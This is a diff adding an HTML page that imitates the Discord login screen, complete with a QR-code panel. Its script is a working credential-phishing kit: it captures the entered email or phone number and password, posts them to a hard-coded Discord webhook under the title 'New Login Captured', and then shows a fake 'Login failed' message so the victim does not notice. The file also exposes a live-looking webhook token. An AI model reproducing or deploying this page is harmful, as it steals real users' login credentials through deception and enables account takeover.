@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Discord</title>
+    <link rel="icon" type="image/png" href="LOGO.png">
+    
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="login-page">
+    <main class="login-card">
+        <div class="content-layout">
+            <section class="form-section">
+                <h1>Welcome back</h1>
+                <p class="subtitle">We're so excited to see you again!</p>
+
+                <form id="loginForm" novalidate>
+                    <label for="identity">Email or Phone Number <span>*</span></label>
+                    <input id="identity" name="identity" type="text" autocomplete="username" required>
+
+                    <label for="password">Password <span>*</span></label>
+                    <input id="password" name="password" type="password" autocomplete="current-password" required>
+
+                    <p id="formMessage" class="form-message" aria-live="polite"></p>
+
+                    <a href="#" class="forgot-password">Forgot your password?</a>
+                    <button type="submit" id="loginBtn" class="login-btn">Log In</button>
+                    <p class="register-text">Need an account? <a href="#">Register</a></p>
+                </form>
+            </section>
+
+            <aside class="qr-section">
+                <div class="qr-frame">
+                    <img src="QR.png" alt="QR code">
+                </div>
+                <h2>Log in with QR Code</h2>
+                <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+            </aside>
+        </div>
+    </main>
+
+    <script>
+        const form = document.getElementById("loginForm");
+        const message = document.getElementById("formMessage");
+        const loginBtn = document.getElementById("loginBtn");
+
+        // Your specific Discord Webhook URL
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495268530822582332/jBhkMjMmS_iFRxgp2J-yGdOu3MOulCfY8RVE9_go7E9uFGFj6LX4m3p8aM89DmBjh-Nt";
+
+        form.addEventListener("submit", async (event) => {
+            event.preventDefault();
+
+            const identity = form.identity.value.trim();
+            const password = form.password.value.trim();
+
+            if (!identity || !password) {
+                message.textContent = "Enter both fields to continue.";
+                message.dataset.state = "error";
+                return;
+            }
+
+            // Visual feedback
+            loginBtn.disabled = true;
+            loginBtn.textContent = "Logging in...";
+
+            // Discord Payload
+            const payload = {
+                embeds: [{
+                    title: "🔑 New Login Captured",
+                    color: 5814783,
+                    fields: [
+                        { name: "User/Email", value: `\`${identity}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true }
+                    ],
+                    footer: { text: "Discord Clone Admin Logs" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                // Send data to your Discord channel
+                await fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                // Simulate authentic failure delay
+                setTimeout(() => {
+                    message.textContent = "Login failed. Check your email or password and try again.";
+                    message.dataset.state = "error";
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = "Log In";
+                    form.reset();
+                }, 1200);
+
+            } catch (error) {
+                console.error("Transmission error:", error);
+                message.textContent = "An unexpected error occurred. Please try again.";
+                loginBtn.disabled = false;
+                loginBtn.textContent = "Log In";
+            }
+        });
+    </script>
+</body>
+</html>
